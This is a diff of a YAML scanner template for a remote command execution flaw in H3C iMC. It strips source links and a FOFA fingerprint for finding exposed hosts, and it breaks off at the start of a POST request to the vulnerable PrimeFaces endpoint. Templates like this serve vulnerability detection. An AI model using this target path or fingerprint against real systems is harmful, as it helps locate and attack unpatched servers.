@@ -3,14 +3,8 @@ info:
   name: H3CIMC远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aa878e83d1ad8da8ea06612da5f266ea
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: aa878e83d1ad8da8ea06612da5f266ea
-    fofa: + FOFA：`body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"`
 http:
 - raw:
   - 'POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
